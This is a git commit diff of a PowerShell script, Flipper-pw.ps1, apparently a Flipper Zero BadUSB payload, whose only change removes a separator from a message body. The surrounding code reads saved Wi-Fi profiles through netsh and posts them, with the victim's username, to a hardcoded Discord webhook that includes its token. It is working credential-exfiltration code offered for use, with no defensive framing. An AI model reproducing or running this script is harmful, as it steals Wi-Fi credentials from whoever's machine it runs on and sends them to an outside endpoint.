068f65b7db206dcd6e7a86fa3ebc7fc12dfe5781
Tips <97804497+TimCrafter25@users.noreply.github.com>
2024-01-12 12:56:25 +0100

    Update Flipper-pw.ps1

--- Flipper-pw.ps1
+++ Flipper-pw.ps1
@@ -12,7 +12,7 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$prof + "`n" + "-------------------------"
+		'content' = [string]$prof
 	}
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri 'https://discord.com/api/webhooks/1188797313347493889/c2t6GjI0i8jpbE3RPer-E5DiuJQ8E6M3Vwnvder_3QI8l6a4XUt-mUHQtYzV_E9ToFMZ' -Method Post -Body ($Body | ConvertTo-Json)
